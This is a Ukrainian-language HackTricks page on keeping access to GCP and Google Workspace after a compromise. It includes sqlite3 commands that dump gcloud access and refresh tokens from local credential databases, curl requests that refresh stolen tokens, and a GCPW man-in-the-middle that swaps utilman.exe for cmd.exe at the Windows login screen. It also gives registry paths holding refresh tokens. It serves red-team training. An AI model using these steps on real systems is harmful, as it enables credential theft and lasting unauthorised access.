# GCP - Non-svc Persistance

{% hint style="success" %}


Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

–¶–µ –∫–æ—Ä–∏—Å–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏, —è–∫—â–æ –≤–∏ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞–ª–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ GCP –∞–±–æ –º–∞—à–∏–Ω—É, —â–æ –ø—Ä–∞—Ü—é—î –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ GCP.

## Token Hijacking

### Authenticated User Tokens

–©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **–ø–æ—Ç–æ—á–Ω–∏–π —Ç–æ–∫–µ–Ω** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏: 

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞ —Ü—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ, —è–∫ **–±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π —Ç–æ–∫–µ–Ω –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é gcloud**:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

–©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–µ—Ç–∞–ª—ñ –¥–ª—è **–≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –Ω–æ–≤–æ–≥–æ —Ç–æ–∫–µ–Ω–∞ –¥–æ—Å—Ç—É–ø—É**, –≤–∏–∫–æ–Ω–∞–π—Ç–µ:

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –∑–Ω–∞–π—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –≤ **`$HOME/.config/gcloud/application_default_credentials.json`** —Ç–∞ –≤ **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`**.

–©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –Ω–æ–≤–∏–π –æ–Ω–æ–≤–ª–µ–Ω–∏–π —Ç–æ–∫–µ–Ω –¥–æ—Å—Ç—É–ø—É –∑ **—Ç–æ–∫–µ–Ω–æ–º –æ–Ω–æ–≤–ª–µ–Ω–Ω—è**, —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–æ–º –∫–ª—ñ—î–Ω—Ç–∞ —Ç–∞ —Å–µ–∫—Ä–µ—Ç–æ–º –∫–ª—ñ—î–Ω—Ç–∞, –≤–∏–∫–æ–Ω–∞–π—Ç–µ: 

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

–¢–µ—Ä–º—ñ–Ω –¥—ñ—ó —Ç–æ–∫–µ–Ω—ñ–≤ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –º–æ–∂–Ω–∞ –∫–µ—Ä—É–≤–∞—Ç–∏ –≤ **Admin** > **Security** > **Google Cloud session control**, —ñ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤—ñ–Ω –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–π –Ω–∞ 16 –≥–æ–¥–∏–Ω, —Ö–æ—á–∞ –π–æ–≥–æ –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Ç–∞–∫, —â–æ–± –≤—ñ–Ω –Ω—ñ–∫–æ–ª–∏ –Ω–µ –∑–∞–∫—ñ–Ω—á—É–≤–∞–≤—Å—è:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Auth flow

–ü—Ä–æ—Ü–µ—Å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –ø—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ —á–æ–≥–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç `gcloud auth login` –≤—ñ–¥–∫—Ä–∏—î –∑–∞–ø–∏—Ç —É –±—Ä–∞—É–∑–µ—Ä—ñ, —ñ –ø—ñ—Å–ª—è –ø—Ä–∏–π–Ω—è—Ç—Ç—è –≤—Å—ñ—Ö –æ–±–ª–∞—Å—Ç–µ–π –±—Ä–∞—É–∑–µ—Ä –Ω–∞–¥—ñ—à–ª–µ –∑–∞–ø–∏—Ç, –ø–æ–¥—ñ–±–Ω–∏–π –¥–æ —Ü—å–æ–≥–æ, –Ω–∞ http-–ø–æ—Ä—Ç, –≤—ñ–¥–∫—Ä–∏—Ç–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–º:
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
–¢–æ–¥—ñ gcloud –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ —Å—Ç–∞–Ω —ñ –∫–æ–¥ –∑ –¥–µ—è–∫–∏–º –∑–∞—à–∏—Ç–∏–º `client_id` (`32555940559.apps.googleusercontent.com`) —Ç–∞ **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`), —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **–æ—Å—Ç–∞–Ω–Ω—ñ –¥–∞–Ω—ñ —Ç–æ–∫–µ–Ω–∞ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è**.

{% hint style="danger" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑–≤'—è–∑–æ–∫ –∑ localhost –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è —á–µ—Ä–µ–∑ HTTP, —Ç–æ–º—É –º–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ—Ö–æ–ø–∏—Ç–∏ –¥–∞–Ω—ñ, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è, –æ–¥–Ω–∞–∫ —Ü—ñ –¥–∞–Ω—ñ –¥—ñ–π—Å–Ω—ñ –ª–∏—à–µ 1 —Ä–∞–∑, —Ç–æ–º—É —Ü–µ –±—É–¥–µ –º–∞—Ä–Ω–æ, –ª–µ–≥—à–µ –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –∑ —Ñ–∞–π–ª—É.
{% endhint %}

### OAuth Scopes

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –≤—Å—ñ Google scopes –Ω–∞ [https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes) –∞–±–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ó—Ö, –≤–∏–∫–æ–Ω–∞–≤—à–∏:

{% code overflow="wrap" %}
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
{% endcode %}

–ú–æ–∂–Ω–∞ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫—ñ –æ–±–ª–∞—Å—Ç—ñ –ø—ñ–¥—Ç—Ä–∏–º—É—î –∑–∞—Å—Ç–æ—Å—É–Ω–æ–∫, —è–∫–∏–π **`gcloud`** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—å–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞:
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
–ü—ñ—Å–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –±—É–ª–æ –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–æ, —â–æ —Ü–µ–π –¥–æ–¥–∞—Ç–æ–∫ –ø—ñ–¥—Ç—Ä–∏–º—É—î —Ü—ñ –æ–±–ª–∞—Å—Ç—ñ:
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
—Ü–µ —Ü—ñ–∫–∞–≤–æ –±–∞—á–∏—Ç–∏, —è–∫ —Ü–µ–π –¥–æ–¥–∞—Ç–æ–∫ –ø—ñ–¥—Ç—Ä–∏–º—É—î **`drive`** –æ–±–ª–∞—Å—Ç—å, —â–æ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É –µ—Å–∫–∞–ª—É–≤–∞—Ç–∏ –∑ GCP –¥–æ Workspace, —è–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω –∑ —Ü—ñ—î—é –æ–±–ª–∞—Å—Ç—é.

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫** [**–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º —Ç—É—Ç**](../gcp-to-workspace-pivoting/#abusing-gcloud)**.**

### –û–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–ª—É–∂–±

–¢–∞–∫ —Å–∞–º–æ, —è–∫ —ñ –∑ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏, —è–∫—â–æ –≤–∞–º –≤–¥–∞—Å—Ç—å—Å—è **–∑–ª–∞–º–∞—Ç–∏ —Ñ–∞–π–ª –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞** –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–¥–æ—Å—Ç—É–ø–∞—Ç–∏ –¥–æ –Ω—å–æ–≥–æ –∑–∞–∑–≤–∏—á–∞–π —Ç–∞–∫ –¥–æ–≤–≥–æ, —è–∫ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ**.\
–û–¥–Ω–∞–∫, —è–∫—â–æ –≤–∏ –≤–∫—Ä–∞–¥–µ—Ç–µ **OAuth —Ç–æ–∫–µ–Ω** –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏, —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ —â–µ —Ü—ñ–∫–∞–≤—ñ—à–µ, –æ—Å–∫—ñ–ª—å–∫–∏, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ü—ñ —Ç–æ–∫–µ–Ω–∏ –∫–æ—Ä–∏—Å–Ω—ñ –ª–∏—à–µ –ø—Ä–æ—Ç—è–≥–æ–º –≥–æ–¥–∏–Ω–∏, —è–∫—â–æ **–∂–µ—Ä—Ç–≤–∞ –≤–∏–¥–∞–ª–∏—Ç—å –ø—Ä–∏–≤–∞—Ç–Ω–∏–π API –∫–ª—é—á, OAuth —Ç–æ–∫–µ–Ω –∑–∞–ª–∏—à–∏—Ç—å—Å—è –¥—ñ–π—Å–Ω–∏–º –¥–æ –π–æ–≥–æ –∑–∞–∫—ñ–Ω—á–µ–Ω–Ω—è**.

### –ú–µ—Ç–∞–¥–∞–Ω—ñ

–û—á–µ–≤–∏–¥–Ω–æ, –ø–æ–∫–∏ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –º–∞—à–∏–Ω–∏, —â–æ –ø—Ä–∞—Ü—é—î –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ GCP, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–¥–æ—Å—Ç—É–ø–∞—Ç–∏ –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–æ–≥–æ –¥–æ —Ü—ñ—î—ó –º–∞—à–∏–Ω–∏, –∑–≤–µ—Ä—Ç–∞—é—á–∏—Å—å –¥–æ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö** (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ OAuth —Ç–æ–∫–µ–Ω–∏, –¥–æ —è–∫–∏—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –Ω–∞ —Ü—ñ–π –∫—ñ–Ω—Ü–µ–≤—ñ–π —Ç–æ—á—Ü—ñ, –∑–∞–∑–≤–∏—á–∞–π –æ–±–º–µ–∂–µ–Ω—ñ –æ–±–ª–∞—Å—Ç—è–º–∏).

### –ó–∞—Ö–æ–¥–∏ –∑ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è

–î–µ—è–∫—ñ –∑–∞—Ö–æ–¥–∏ –∑ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –¥–ª—è —Ü–∏—Ö —Ç–µ—Ö–Ω—ñ–∫ –ø–æ—è—Å–Ω–µ–Ω—ñ –≤ [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

## GCPW - Google Credential Provider for Windows

–¶–µ —î–¥–∏–Ω–∏–π –≤—Ö—ñ–¥, —è–∫–∏–π –Ω–∞–¥–∞—î Google Workspaces, —â–æ–± –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–æ–≥–ª–∏ –≤—Ö–æ–¥–∏—Ç–∏ –≤ —Å–≤–æ—ó –ü–ö –∑ Windows, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **—Å–≤–æ—ó –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Workspace**. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —Ü–µ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ —Ç–æ–∫–µ–Ω–∏ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ Google Workspace –≤ –¥–µ—è–∫–æ–º—É –º—ñ—Å—Ü—ñ –Ω–∞ –ü–ö.

### GCPW - MitM

–ö–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ –ü–ö –∑ Windows, —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–æ–≤–∞–Ω–æ–≥–æ –∑ Google Workspace —á–µ—Ä–µ–∑ GCPW, –π–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ –∑–∞–ø–æ–≤–Ω–∏—Ç–∏ –∑–∞–≥–∞–ª—å–Ω—É —Ñ–æ—Ä–º—É –≤—Ö–æ–¥—É. –¶—è —Ñ–æ—Ä–º–∞ –≤—Ö–æ–¥—É –ø–æ–≤–µ—Ä–Ω–µ OAuth –∫–æ–¥, —è–∫–∏–π –ü–ö –æ–±–º—ñ–Ω—è—î –Ω–∞ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –≤ –∑–∞–ø–∏—Ç—ñ, –ø–æ–¥—ñ–±–Ω–æ–º—É –¥–æ: 

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

New lines have been added to make it more readable.

{% hint style="info" %}
–ë—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º –≤–∏–∫–æ–Ω–∞—Ç–∏ MitM, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ `Proxifier` –Ω–∞ –ü–ö, –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–≤—à–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `utilman.exe` –Ω–∞ `cmd.exe` —Ç–∞ –∑–∞–ø—É—Å—Ç–∏–≤—à–∏ **—Ñ—É–Ω–∫—Ü—ñ—ó –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—ñ** –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –≤—Ö–æ–¥—É –≤ Windows, —â–æ –≤–∏–∫–æ–Ω–∞—î **CMD**, –∑ —è–∫–æ–≥–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ Proxifier**.\
–ù–µ –∑–∞–±—É–¥—å—Ç–µ **–±–ª–æ–∫—É–≤–∞—Ç–∏ QUICK UDP** —Ç—Ä–∞—Ñ—ñ–∫ —É `Proxifier`, —â–æ–± –≤—ñ–Ω –∑–Ω–∏–∑–∏–≤—Å—è –¥–æ TCP –∑–≤'—è–∑–∫—É, —ñ –≤–∏ –º–æ–≥–ª–∏ –π–æ–≥–æ –±–∞—á–∏—Ç–∏.

–¢–∞–∫–æ–∂ –Ω–∞–ª–∞—à—Ç—É–π—Ç–µ –≤ "–°–ª—É–∂–±–∏ —Ç–∞ —ñ–Ω—à—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ" –æ–±–∏–¥–≤—ñ –æ–ø—Ü—ñ—ó —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç Burp CA –≤ Windows.
{% endhint %}

–ö—Ä—ñ–º —Ç–æ–≥–æ, –¥–æ–¥–∞–≤—à–∏ –∫–ª—é—á—ñ `enable_verbose_logging = 1` —Ç–∞ `log_file_path = C:\Public\gcpw.log` –≤ **`HKLM:\SOFTWARE\Google\GCPW`**, –º–æ–∂–Ω–∞ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –¥–µ—è–∫—ñ –∂—É—Ä–Ω–∞–ª–∏.

### GCPW - –í—ñ–¥–±–∏—Ç–æ–∫

–ú–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ GCPW –Ω–∞ –ø—Ä–∏—Å—Ç—Ä–æ—ó, –ø–µ—Ä–µ–≤—ñ—Ä–∏–≤—à–∏, —á–∏ —ñ—Å–Ω—É—î –Ω–∞—Å—Ç—É–ø–Ω–∏–π –ø—Ä–æ—Ü–µ—Å –∞–±–æ —á–∏ —ñ—Å–Ω—É—é—Ç—å –Ω–∞—Å—Ç—É–ø–Ω—ñ –∫–ª—é—á—ñ —Ä–µ—î—Å—Ç—Ä—É:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
–í **`HKCU:\SOFTWARE\Google\Accounts`** –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ–≥–æ **refresh token**, —è–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –Ω–µ—â–æ–¥–∞–≤–Ω–æ —É–≤—ñ–π—à–æ–≤ –≤ —Å–∏—Å—Ç–µ–º—É.

–í **`HKLM:\SOFTWARE\Google\GCPW\Users`** –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ **–¥–æ–º–µ–Ω** , —è–∫—ñ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –¥–ª—è –≤—Ö–æ–¥—É –≤ –∫–ª—é—á—ñ `domains_allowed`, –∞ –≤ –ø—ñ–¥–∫–ª—é—á–∞—Ö –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Ç–∞–∫—É —è–∫ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞ –ø–æ—à—Ç–∞, –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Ç–µ—Ä–º—ñ–Ω–∏ –¥—ñ—ó —Ç–æ–∫–µ–Ω—ñ–≤, –æ–±—Ä–æ–±–Ω–∏–∫ —Ç–æ–∫–µ–Ω—ñ–≤...

{% hint style="info" %}
–û–±—Ä–æ–±–Ω–∏–∫ —Ç–æ–∫–µ–Ω—ñ–≤ - —Ü–µ —Ç–æ–∫–µ–Ω, —è–∫–∏–π –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ `eth.`, –∑ —è–∫–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∏—Ç—è–≥—Ç–∏ –¥–µ—è–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞–ø–∏—Ç—É, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –∑–Ω–∞–π—Ç–∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ç–æ–∫–µ–Ω–∞ –¥–æ—Å—Ç—É–ø—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞–ø–∏—Ç—É, —è–∫-–æ—Ç:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

–ù–∞—Å–∫—ñ–ª—å–∫–∏ –º–µ–Ω—ñ –≤—ñ–¥–æ–º–æ, –Ω–µ–º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ refresh token –∞–±–æ access token –∑ token handle.
{% endhint %}

